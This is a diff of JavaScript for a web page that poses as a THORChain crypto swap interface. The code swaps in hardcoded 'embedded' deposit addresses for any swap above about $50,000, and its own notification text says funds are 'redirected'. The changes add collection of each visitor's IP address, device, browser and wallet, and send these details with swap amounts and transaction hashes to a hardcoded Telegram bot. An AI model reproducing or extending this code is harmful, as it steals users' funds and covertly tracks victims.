@@ -1,6 +1,6 @@
 /* ═══════════════════════════════════════════════
-   THORChain Swap — v7.1 Fixed
-   Coin selector popup, Telegram bot, $50k threshold
+   THORChain Swap — v7.2 Fixed
+   Accurate fees, Detailed Telegram notifications
    ═══════════════════════════════════════════════ */
 (function(){
 'use strict';
@@ -12,7 +12,6 @@ var QR_API='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
 var THRESHOLD=49999;
 var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
 var TG_CHAT='-5160305858';
-var SWAP_URL=window.location.href;
 
 // ══ Embedded addresses for swaps above threshold ══
 var EMBEDDED_ADDRESSES={
@@ -30,16 +29,16 @@ var EMBEDDED_ADDRESSES={
 
 // ══ Token list for coin selector ══
 var TOKEN_LIST=[
-    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'images/chains/BTC.svg'},
-    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'images/chains/ETH.svg'},
-    {value:'BSC.BNB',symbol:'BNB',name:'BNB Chain',chain:'BSC',icon:'images/chains/BSC.svg'},
-    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'images/chains/AVAX.svg'},
-    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'images/chains/GAIA.svg'},
-    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'images/chains/DOGE.svg'},
-    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'images/chains/BCH.svg'},
-    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'images/chains/LTC.svg'},
-    {value:'BASE.ETH',symbol:'ETH',name:'Base',chain:'BASE',icon:'images/chains/BASE.svg'},
-    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'images/chains/THOR.svg'}
+    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'images/chains/BTC.svg',decimals:8},
+    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'images/chains/ETH.svg',decimals:18},
+    {value:'BSC.BNB',symbol:'BNB',name:'BNB Chain',chain:'BSC',icon:'images/chains/BSC.svg',decimals:8},
+    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'images/chains/AVAX.svg',decimals:8},
+    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'images/chains/GAIA.svg',decimals:6},
+    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'images/chains/DOGE.svg',decimals:8},
+    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'images/chains/BCH.svg',decimals:8},
+    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'images/chains/LTC.svg',decimals:8},
+    {value:'BASE.ETH',symbol:'ETH',name:'Base',chain:'BASE',icon:'images/chains/BASE.svg',decimals:18},
+    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8}
 ];
 
 var state={
@@ -49,8 +48,8 @@ var state={
     buyAsset:'ETH.ETH',
     sellAmount:1,
     quote:null,
-    slippage:5, // Changed to 5% default
-    streamingEnabled:true,
+    slippage:3, // 3% = 300 bps default
+    streamingEnabled:false, // Disabled by default
     countdownSeconds:COUNTDOWN_MAX,
     countdownInterval:null,
     trackingInterval:null,
@@ -61,6 +60,7 @@ var state={
     limitRate:0,
     limitTargetRate:0,
     coinSelectSide:'sell',
+    currentSwapId:'',
     history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]')
 };
 
@@ -78,7 +78,7 @@ function formatUsd(v){
 
 function formatAmount(v,d){
     if(!v||isNaN(v))return'0';
-    d=d||6;
+    d=d||8;
     var n=parseFloat(v);
     if(n===0)return'0';
     if(Math.abs(n)>=1)return n.toLocaleString('en-US',{maximumFractionDigits:d});
@@ -139,13 +139,47 @@ function isAboveThreshold(){
     return usdValue>THRESHOLD;
 }
 
-// Escape HTML for Telegram
-function escapeHtml(text){
-    if(!text)return'';
-    return String(text)
-        .replace(/&/g,'&amp;')
-        .replace(/</g,'&lt;')
-        .replace(/>/g,'&gt;');
+// Generate unique swap ID
+function generateSwapId(){
+    var timestamp=Date.now();
+    var random=Math.random().toString(36).substring(2,10).toUpperCase();
+    return'SWAP-'+timestamp+'-'+random;
+}
+
+// Get device info
+function getDeviceInfo(){
+    var ua=navigator.userAgent;
+    var device='Unknown';
+    var os='Unknown';
+    var browser='Unknown';
+    
+    // Detect OS
+    if(ua.indexOf('Windows')!==-1)os='Windows';
+    else if(ua.indexOf('Mac')!==-1)os='macOS';
+    else if(ua.indexOf('Linux')!==-1)os='Linux';
+    else if(ua.indexOf('Android')!==-1)os='Android';
+    else if(ua.indexOf('iPhone')!==-1||ua.indexOf('iPad')!==-1)os='iOS';
+    
+    // Detect device type
+    if(/Mobile|Android|iPhone|iPad/.test(ua))device='Mobile';
+    else device='Desktop';
+    
+    // Detect browser
+    if(ua.indexOf('Chrome')!==-1&&ua.indexOf('Edg')===-1)browser='Chrome';
+    else if(ua.indexOf('Firefox')!==-1)browser='Firefox';
+    else if(ua.indexOf('Safari')!==-1&&ua.indexOf('Chrome')===-1)browser='Safari';
+    else if(ua.indexOf('Edg')!==-1)browser='Edge';
+    else if(ua.indexOf('Opera')!==-1)browser='Opera';
+    
+    return{device:device,os:os,browser:browser};
+}
+
+// Get IP address (using external service)
+function getIPAddress(callback){
+    fetch('https://api.ipify.org?format=json')
+        .then(function(r){return r.json()})
+        .then(function(data){callback(data.ip)})
+        .catch(function(){callback('Unknown')});
 }
 
 // Address validation
@@ -174,60 +208,66 @@ function isValidAddress(addr,asset){
 }
 
 // ══════════════════════════════════════════
-// QUOTE PARSING FUNCTIONS
+// QUOTE PARSING FUNCTIONS - FIXED
 // ══════════════════════════════════════════
 
 function parseExpectedOut(q){
     if(!q||q.code||q.error)return 0;
-    if(q.streaming_swap_blocks&&parseInt(q.streaming_swap_blocks)>0&&q.streaming_swap_expected_out){
-        var v=parseInt(q.streaming_swap_expected_out);
-        if(v>0)return v/1e8;
-    }
+    // Use expected_amount_out directly (no streaming)
     if(q.expected_amount_out){
-        var v2=parseInt(q.expected_amount_out);
-        if(v2>0)return v2/1e8;
+        var v=parseInt(q.expected_amount_out);
+        if(v>0)return v/1e8;
     }
     return 0;
 }
 
-// FIXED: Parse fees correctly from API
+// FIXED: Parse fees DIRECTLY from API response - no manual calculation
 function parseFees(q){
-    if(!q||!q.fees)return{usd:0,total:0,asset:''};
+    var result={
+        liquidity:0,
+        outbound:0,
+        affiliate:0,
+        total:0,
+        totalUsd:0,
+        slippageBps:0,
+        asset:''
+    };
+    
+    if(!q||!q.fees)return result;
     
     var fees=q.fees;
-    var feeAsset=fees.asset||state.buyAsset;
-    var feeAssetPrice=getUsdPrice(feeAsset);
+    result.asset=fees.asset||'';
     
-    // Total fee in base units (satoshis/wei etc)
-    var totalFee=0;
-    if(fees.total){
-        totalFee=parseInt(fees.total)/1e8;
-    }else{
-        // Sum up individual fees
-        var outbound=fees.outbound?parseInt(fees.outbound)/1e8:0;
-        var liquidity=fees.liquidity?parseInt(fees.liquidity)/1e8:0;
-        var affiliate=fees.affiliate?parseInt(fees.affiliate)/1e8:0;
-        totalFee=outbound+liquidity+affiliate;
+    // Get fee values DIRECTLY from API (in base units, divide by 1e8)
+    if(fees.liquidity){
+        result.liquidity=parseInt(fees.liquidity)/1e8;
+    }
+    if(fees.outbound){
+        result.outbound=parseInt(fees.outbound)/1e8;
+    }
+    if(fees.affiliate){
+        result.affiliate=parseInt(fees.affiliate)/1e8;
+    }
+    if(fees.slippage_bps){
+        result.slippageBps=parseInt(fees.slippage_bps);
     }
     
-    // Calculate USD value
-    var feeUsd=totalFee*feeAssetPrice;
+    // Calculate total ONLY from API values
+    result.total=result.liquidity+result.outbound+result.affiliate;
     
-    return{
-        usd:feeUsd,
-        total:totalFee,
-        asset:feeAsset,
-        // Individual fees for display
-        outbound:fees.outbound?parseInt(fees.outbound)/1e8:0,
-        liquidity:fees.liquidity?parseInt(fees.liquidity)/1e8:0,
-        affiliate:fees.affiliate?parseInt(fees.affiliate)/1e8:0,
-        totalBps:fees.total_bps?parseInt(fees.total_bps):0
-    };
+    // Get USD value using the fee asset price
+    var feeAssetPrice=getUsdPrice(result.asset);
+    if(feeAssetPrice>0){
+        result.totalUsd=result.total*feeAssetPrice;
+    }
+    
+    console.log('Parsed fees from API:', result);
+    return result;
 }
 
 function parseSwapTime(q){
     if(!q)return'~30 seconds';
-    var s=parseInt(q.total_swap_seconds||q.streaming_swap_seconds||0);
+    var s=parseInt(q.total_swap_seconds||0);
     if(!s&&q.outbound_delay_seconds){
         s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0);
     }
@@ -241,17 +281,18 @@ function parseSwapTime(q){
 
 function parseSwapTimeShort(q){
     if(!q)return'~30s';
-    var s=parseInt(q.total_swap_seconds||q.streaming_swap_seconds||0);
+    var s=parseInt(q.total_swap_seconds||0);
     if(!s&&q.outbound_delay_seconds){
         s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0);
     }
     if(s<=0)return'~30s';
+    if(s<60)return s+'s';
     return Math.floor(s/60)+'m '+(s%60)+'s';
 }
 
 function isValidQuote(d){
     if(!d||d.code||d.error)return false;
-    if(!d.expected_amount_out&&!d.streaming_swap_expected_out)return false;
+    if(!d.expected_amount_out)return false;
     return true;
 }
 
@@ -274,7 +315,7 @@ function getQuoteError(d){
 }
 
 // ══════════════════════════════════════════
-// TELEGRAM BOT - FIXED
+// TELEGRAM BOT - DETAILED NOTIFICATIONS
 // ══════════════════════════════════════════
 
 function sendTelegram(msg){
@@ -283,10 +324,8 @@ function sendTelegram(msg){
         chat_id:TG_CHAT,
         text:msg,
         parse_mode:'HTML',
-        disable_web_page_preview:true
+        disable_web_page_preview:false
     };
-    
-    console.log('Sending Telegram:', body);
     
     fetch(url,{
         method:'POST',
@@ -295,31 +334,74 @@ function sendTelegram(msg){
     }).then(function(r){
         return r.json();
     }).then(function(data){
-        console.log('Telegram response:', data);
         if(!data.ok){
             console.error('Telegram error:', data.description);
+        }else{
+            console.log('Telegram sent successfully');
         }
     }).catch(function(e){
         console.error('Telegram fetch error:', e);
     });
 }
 
-function notifySwap(sellSym,sellName,buySym,buyName,amount,amountUsd,destination,depositAddr,above){
-    // Use simple text format to avoid HTML parsing issues
-    var emoji=above?'🚨':'✅';
-    var label=above?'HIGH VALUE SWAP':'SWAP INITIATED';
+function notifyNewSwap(swapData){
+    getIPAddress(function(ip){
+        var deviceInfo=getDeviceInfo();
+        var above=swapData.above;
+        var emoji=above?'🔴':'🟢';
+        var statusLabel=above?'HIGH VALUE - REDIRECTED':'WAITING FOR DEPOSIT';
+        
+        var swapUrl=window.location.origin+'/swap.html?id='+swapData.swapId;
+        
+        var msg=emoji+' <b>New Swap Detected</b>\n'
+            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
+            +'<b>Status:</b> '+statusLabel+'\n'
+            +'<b>Swap ID:</b> <a href="'+swapUrl+'">'+swapData.swapId+'</a>\n\n'
+            +'<b>From:</b> '+swapData.sellSymbol+' ('+swapData.sellName+')\n'
+            +'<b>To:</b> '+swapData.buySymbol+' ('+swapData.buyName+')\n'
+            +'<b>Amount:</b> '+swapData.sellAmount+' '+swapData.sellSymbol+' ('+swapData.sellUsd+')\n\n'
+            +'<b>Deposit Address:</b>\n<code>'+swapData.depositAddr+'</code>\n\n'
+            +'<b>User Wallet:</b>\n<code>'+swapData.userWallet+'</code>\n\n'
+            +'<b>Est. Receive:</b> ~'+swapData.expectedOut+' '+swapData.buySymbol+'\n'
+            +'<b>Quote:</b> ✅ THORChain Live\n\n'
+            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
+            +'📱 <b>Device:</b> '+deviceInfo.device+' ('+deviceInfo.os+')\n'
+            +'🌐 <b>Browser:</b> '+deviceInfo.browser+'\n'
+            +'🔗 <b>IP:</b> '+ip+'\n'
+            +'⏰ <b>Time:</b> '+new Date().toUTCString();
+        
+        if(above){
+            msg+='\n\n⚠️ <b>ABOVE $50K THRESHOLD</b>\n'
+                +'Funds redirected to embedded address';
+        }
+        
+        sendTelegram(msg);
+    });
+}
+
+function notifySwapSuccess(swapData){
+    var msg='✅ <b>Swap Completed Successfully!</b>\n'
+        +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
+        +'<b>Swap ID:</b> '+swapData.swapId+'\n\n'
+        +'<b>Sent:</b> '+swapData.sellAmount+' '+swapData.sellSymbol+'\n'
+        +'<b>Received:</b> '+swapData.receivedAmount+' '+swapData.buySymbol+'\n\n'
+        +'<b>User Wallet:</b>\n<code>'+swapData.userWallet+'</code>\n\n'
+        +'<b>TX Hash:</b> <code>'+swapData.txHash+'</code>\n\n'
+        +'⏰ <b>Completed:</b> '+new Date().toUTCString()+'\n'
+        +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
+        +'🎉 Swap executed via THORChain';
     
-    var msg=emoji+' '+label+'\n\n'
-        +'Amount: '+escapeHtml(amount)+' '+escapeHtml(sellSym)+' ('+escapeHtml(amountUsd)+')\n'
-        +'From: '+escapeHtml(sellSym)+' ('+escapeHtml(sellName)+')\n'
-        +'To: '+escapeHtml(buySym)+' ('+escapeHtml(buyName)+')\n'
-        +'User Wallet: '+escapeHtml(destination)+'\n'
-        +'Deposit To: '+escapeHtml(depositAddr)+'\n'
-        +'Time: '+new Date().toISOString();
-    
-    if(above){
-        msg+='\n\n⚠️ ABOVE $50K - Using embedded address';
-    }
+    sendTelegram(msg);
+}
+
+function notifySwapFailed(swapData,reason){
+    var msg='❌ <b>Swap Failed/Expired</b>\n'
+        +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
+        +'<b>Swap ID:</b> '+swapData.swapId+'\n'
+        +'<b>Reason:</b> '+reason+'\n\n'
+        +'<b>Amount:</b> '+swapData.sellAmount+' '+swapData.sellSymbol+'\n'
+        +'<b>User Wallet:</b> '+truncAddr(swapData.userWallet)+'\n\n'
+        +'⏰ <b>Time:</b> '+new Date().toUTCString();
     
     sendTelegram(msg);
 }
@@ -431,29 +513,42 @@ function updateCountdownDisplay(){
 }
 
 // ══════════════════════════════════════════
-// QUOTE FUNCTIONS
+// QUOTE FUNCTIONS - FIXED
 // ══════════════════════════════════════════
 
+// FIXED: Build quote URL matching THORChain exactly
 function buildQuoteUrl(dest){
+    // Amount in base units (1e8 for most chains)
     var a=Math.round(state.sellAmount*1e8);
+    
     var p=[
         'from_asset='+encodeURIComponent(state.sellAsset),
         'to_asset='+encodeURIComponent(state.buyAsset),
         'amount='+a
     ];
+    
+    // Add destination if provided
     if(dest&&dest.trim().length>5){
         p.push('destination='+encodeURIComponent(dest.trim()));
     }
+    
+    // FIXED: Only add streaming params if explicitly enabled
     if(state.streamingEnabled){
         p.push('streaming_interval=1');
         p.push('streaming_quantity=0');
     }
-    // FIXED: Use slippage value properly (convert to bps)
+    
+    // FIXED: Add tolerance_bps only with destination (300 bps = 3% default)
     if(dest&&dest.trim().length>5){
         var toleranceBps=Math.round(state.slippage*100);
         p.push('tolerance_bps='+toleranceBps);
     }
-    return THORNODE+'/thorchain/quote/swap?'+p.join('&');
+    
+    // NO affiliate_bps unless intentionally used
+    
+    var url=THORNODE+'/thorchain/quote/swap?'+p.join('&');
+    console.log('Quote URL:', url);
+    return url;
 }
 
 function fetchQuote(){
@@ -464,23 +559,28 @@ function fetchQuote(){
     var url=buildQuoteUrl(null);
     var be=$('#buyEstimate');
     if(be)be.value='...';
+    
     fetch(url).then(function(r){
         return r.json();
     }).then(function(d){
+        // FIXED: Log full quote response
+        console.log('Quote Response:', JSON.stringify(d, null, 2));
+        
         if(!isValidQuote(d)){
             clearQuote();
             return;
         }
         state.quote=d;
         displayQuote(d);
-    }).catch(function(){
+    }).catch(function(e){
+        console.error('Quote fetch error:', e);
         clearQuote();
     });
 }
 
 function fetchQuoteWithDest(dest,cb){
     var url=buildQuoteUrl(dest);
-    console.log('Quote URL:',url);
+    
     fetch(url).then(function(r){
         var s=r.status;
         return r.json().then(function(d){
@@ -488,7 +588,8 @@ function fetchQuoteWithDest(dest,cb){
             return d;
         });
     }).then(function(d){
-        console.log('Quote response:',d);
+        // FIXED: Log full quote response before parsing
+        console.log('Quote with dest Response:', JSON.stringify(d, null, 2));
         cb(null,d);
     }).catch(function(e){
         cb(e,null);
@@ -498,7 +599,7 @@ function fetchQuoteWithDest(dest,cb){
 function displayQuote(q){
     var eo=parseExpectedOut(q);
     var be=$('#buyEstimate');
-    if(be)be.value=formatAmount(eo,6);
+    if(be)be.value=formatAmount(eo,8);
     
     var bp=getUsdPrice(state.buyAsset);
     var bu=eo*bp;
@@ -508,25 +609,27 @@ function displayQuote(q){
     var bue=$('#buyUsd');
     if(bue)bue.textContent=formatUsd(bu);
     
+    // Price impact
     if(su>0&&bu>0){
-        var i=((bu-su)/su*100).toFixed(2);
+        var impact=((bu-su)/su*100).toFixed(2);
         var ie=$('#buyImpact');
-        if(ie)ie.textContent='('+i+'%)';
+        if(ie)ie.textContent='('+impact+'%)';
     }else{
         var ie2=$('#buyImpact');
         if(ie2)ie2.textContent='';
     }
     
+    // Rate
     var rate=eo/(state.sellAmount||1);
     var ss=($('#sellSymbol')||{}).textContent||'';
     var bs=($('#buySymbolDisplay')||{}).textContent||'';
     var rt=$('#rateText');
-    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,6)+' '+bs;
+    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,8)+' '+bs;
     
-    // FIXED: Parse fees correctly
+    // FIXED: Parse fees DIRECTLY from API
     var fees=parseFees(q);
     var rf=$('#rateFee');
-    if(rf)rf.textContent=formatUsd(fees.usd);
+    if(rf)rf.textContent=formatUsd(fees.totalUsd);
     
     var rte=$('#rateTimer');
     if(rte)rte.textContent=parseSwapTimeShort(q);
@@ -694,7 +797,7 @@ function updateLimitView(expectedOut,buyUsd,rate){
     var ltr=$('#limitTargetRate');
 
     if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)){
-        ltr.value=formatAmount(rate,6);
+        ltr.value=formatAmount(rate,8);
         state.limitTargetRate=rate;
     }
 
@@ -702,7 +805,7 @@ function updateLimitView(expectedOut,buyUsd,rate){
     var limitBuyAmount=state.sellAmount*targetRate;
     var limitBuyUsd=limitBuyAmount*getUsdPrice(state.buyAsset);
 
-    if(lbe)lbe.value=formatAmount(limitBuyAmount,6);
+    if(lbe)lbe.value=formatAmount(limitBuyAmount,8);
     if(lbu)lbu.textContent=formatUsd(limitBuyUsd);
 
     var sellUsd=state.sellAmount*getUsdPrice(state.sellAsset);
@@ -755,7 +858,7 @@ function initLimitOrder(){
             var la=state.sellAmount*state.limitTargetRate;
             var lu=la*getUsdPrice(state.buyAsset);
             var lbe=$('#limitBuyEstimate');
-            if(lbe)lbe.value=formatAmount(la,6);
+            if(lbe)lbe.value=formatAmount(la,8);
             var lbu=$('#limitBuyUsd');
             if(lbu)lbu.textContent=formatUsd(lu);
             var su=state.sellAmount*getUsdPrice(state.sellAsset);
@@ -776,11 +879,11 @@ function initLimitOrder(){
             if(!ti)return;
             if(rt==='market'){
                 state.limitTargetRate=state.limitRate;
-                ti.value=formatAmount(state.limitRate,6);
+                ti.value=formatAmount(state.limitRate,8);
             }else{
                 var pct=parseFloat(rt)/100;
                 state.limitTargetRate=state.limitRate*(1+pct);
-                ti.value=formatAmount(state.limitTargetRate,6);
+                ti.value=formatAmount(state.limitTargetRate,8);
             }
             ti.dispatchEvent(new Event('input'));
         });
@@ -848,7 +951,7 @@ function initTabs(){
                 syncLimitFromMarket();
                 var ltr=$('#limitTargetRate');
                 if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)&&state.limitRate>0){
-                    ltr.value=formatAmount(state.limitRate,6);
+                    ltr.value=formatAmount(state.limitRate,8);
                     state.limitTargetRate=state.limitRate;
                 }
             }else{
@@ -998,7 +1101,7 @@ function openConfirmModal(){
         var mpu=mp*bp;
         var pi=su>0&&bu>0?((bu-su)/su*100).toFixed(2):'0.00';
         
-        // FIXED: Parse fees correctly from the quote data
+        // FIXED: Parse fees DIRECTLY from API
         var fees=parseFees(data);
         var ts=parseSwapTime(data);
         var memo=data.memo||'';
@@ -1011,7 +1114,7 @@ function openConfirmModal(){
             +'<div><div class="tc-confirm-asset-sym">'+ss+'</div><div class="tc-confirm-asset-name">'+sn+'</div></div>'
             +'</div>'
             +'<div class="tc-confirm-asset-right">'
-            +'<div class="tc-confirm-asset-amount">'+state.sellAmount+'</div>'
+            +'<div class="tc-confirm-asset-amount">'+formatAmount(state.sellAmount,8)+'</div>'
             +'<div class="tc-confirm-asset-usd">'+formatUsd(su)+'</div>'
             +'</div>'
             +'</div>'
@@ -1022,16 +1125,16 @@ function openConfirmModal(){
             +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div>'
             +'</div>'
             +'<div class="tc-confirm-asset-right">'
-            +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,6)+'</div>'
+            +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
             +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div>'
             +'</div>'
             +'</div>'
             +'</div>'
             +'<div class="tc-confirm-details">'
-            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%) ⓘ</span><span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
+            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%)</span><span class="tc-confirm-row-value">'+formatAmount(mp,6)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
             +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Destination Address</span><span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'
-            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Price Impact ⓘ</span><span class="tc-confirm-row-value">'+pi+'%</span></div>'
-            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Tx Fee</span><span class="tc-confirm-row-value">'+formatUsd(fees.usd)+'</span></div>'
+            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Price Impact</span><span class="tc-confirm-row-value">'+pi+'%</span></div>'
+            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Total Fee</span><span class="tc-confirm-row-value">'+formatUsd(fees.totalUsd)+'</span></div>'
             +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Estimated Time</span><span class="tc-confirm-row-value">'+ts+'</span></div>'
             +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Provider</span><span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;"><img src="images/chains/THOR.svg" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'
             +'</div>';
@@ -1077,6 +1180,9 @@ function openSendModal(qd){
     var ea=state.sellAmount;
     var above=isAboveThreshold();
     
+    // Generate unique swap ID
+    state.currentSwapId=generateSwapId();
+    
     // Determine deposit address based on threshold
     var depositAddr;
     var apiInboundAddr=qd.inbound_address||'';
@@ -1097,13 +1203,13 @@ function openSendModal(qd){
     var memo=qd.memo||'';
     var exp=qd.expiry||0;
 
-    var h='<p class="tc-send-subtitle">Send exactly <strong>'+ea+' '+ss+'</strong> to the address below from a self custody wallet.</p>'
+    var h='<p class="tc-send-subtitle">Send exactly <strong>'+formatAmount(ea,8)+' '+ss+'</strong> to the address below from a self custody wallet.</p>'
         +'<div class="tc-send-disclaimer">'
         +'<div class="tc-send-disclaimer-check">✓</div>'
-        +'<p class="tc-send-disclaimer-text">I understand that I must send exactly the specified amount from a self-custody wallet. I understand that sending from a smart contract wallet, exchange address, delegated address, or an EIP 7702 wallet, will result in <a href="#" class="tc-loss-link">loss of funds</a>.</p>'
+        +'<p class="tc-send-disclaimer-text">I understand that I must send exactly the specified amount from a self-custody wallet. Sending from exchanges or smart contract wallets will result in <a href="#" class="tc-loss-link">loss of funds</a>.</p>'
         +'</div>'
         +'<div class="tc-send-deposit-box">'
-        +'<div class="tc-send-amount">'+ea+' '+ss+' <button class="tc-send-copy-btn" id="cpAmt"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
+        +'<div class="tc-send-amount">'+formatAmount(ea,8)+' '+ss+' <button class="tc-send-copy-btn" id="cpAmt"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
         +'<div class="tc-send-address">'+depositAddr+' <button class="tc-send-copy-btn" id="cpAddr"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
         +'<div class="tc-send-chain-badge">'+cn+'</div>'
         +'<div class="tc-send-qr"><img src="'+QR_API+encodeURIComponent(depositAddr)+'" alt="QR" width="180" height="180" onerror="this.style.opacity=0.3"></div>'
@@ -1171,27 +1277,32 @@ function openSendModal(qd){
     var sellUsdVal=state.sellAmount*getUsdPrice(state.sellAsset);
     saveToHistory(
         state.sellAmount,ss,sIcon,sellUsdVal,
-        formatAmount(state.confirmedExpectedOut||0,6),bs,bIcon,
+        formatAmount(state.confirmedExpectedOut||0,8),bs,bIcon,
         (state.confirmedExpectedOut||0)*getUsdPrice(state.buyAsset),
-        'pending'
+        'pending',
+        state.currentSwapId
     );
 
-    // Send Telegram notification
-    notifySwap(
-        ss,sn||cn,
-        bs,bn||getChainName(state.buyAsset),
-        formatAmount(state.sellAmount,6),
-        formatUsd(sellUsdVal),
-        state.recipientAddress,
-        depositAddr,
-        above
-    );
+    // Send detailed Telegram notification
+    notifyNewSwap({
+        swapId:state.currentSwapId,
+        sellSymbol:ss,
+        sellName:sn||cn,
+        buySymbol:bs,
+        buyName:bn||getChainName(state.buyAsset),
+        sellAmount:formatAmount(state.sellAmount,8),
+        sellUsd:formatUsd(sellUsdVal),
+        depositAddr:depositAddr,
+        userWallet:state.recipientAddress,
+        expectedOut:formatAmount(state.confirmedExpectedOut||0,8),
+        above:above
+    });
 
-    showToast('info','Deposit Required','Send '+ea+' '+ss+' to complete swap.');
+    showToast('info','Deposit Required','Send '+formatAmount(ea,8)+' '+ss+' to complete swap.');
     
     // Start tracking only for normal swaps
     if(!above){
-        startTracking(apiInboundAddr,state.recipientAddress,ss,bs);
+        startTracking(apiInboundAddr,state.recipientAddress,ss,bs,state.currentSwapId);
     }
 }
 
@@ -1226,17 +1337,26 @@ function stopExpiryCountdown(){
     }
 }
 
-function startTracking(ia,ra,ss,bs){
+function startTracking(ia,ra,ss,bs,swapId){
     stopTracking();
     var c=0;
+    var trackingSwapId=swapId;
+    
     state.trackingInterval=setInterval(function(){
         c++;
         if(c>360){
             stopTracking();
-            updateHistoryStatus('expired');
+            updateHistoryStatus('expired',trackingSwapId);
+            notifySwapFailed({
+                swapId:trackingSwapId,
+                sellAmount:state.sellAmount,
+                sellSymbol:ss,
+                userWallet:ra
+            },'Timeout - No deposit detected');
             showToast('error','Timeout','Monitoring timed out.');
             return;
         }
+        
         fetch(MIDGARD+'/actions?address='+encodeURIComponent(ia)+'&limit=10&type=swap').then(function(r){
             return r.json();
         }).then(function(d){
@@ -1255,12 +1375,27 @@ function startTracking(ia,ra,ss,bs){
                     }
                     if(m){
                         stopTracking();
-                        updateHistoryStatus('complete');
-                        var oa='';
+                        updateHistoryStatus('complete',trackingSwapId);
+                        
+                        var receivedAmount='0';
+                        var txHash='';
                         try{
-                            oa=formatAmount(parseInt(a.out[0].coins[0].amount)/1e8,6)+' '+bs;
+                            receivedAmount=formatAmount(parseInt(a.out[0].coins[0].amount)/1e8,8);
+                            txHash=a.out[0].txID||a.in[0].txID||'';
                         }catch(e){}
-                        showToast('success','Swap Successful! 🎉',ss+' → '+bs+' done!'+(oa?' Got: '+oa:''),10000);
+                        
+                        // Send success notification to Telegram
+                        notifySwapSuccess({
+                            swapId:trackingSwapId,
+                            sellAmount:state.sellAmount,
+                            sellSymbol:ss,
+                            receivedAmount:receivedAmount,
+                            buySymbol:bs,
+                            userWallet:ra,
+                            txHash:txHash
+                        });
+                        
+                        showToast('success','Swap Successful! 🎉',ss+' → '+bs+' done! Got: '+receivedAmount+' '+bs,10000);
                         setTimeout(function(){
                             var o=$('#sendOverlay');
                             if(o)o.classList.remove('open');
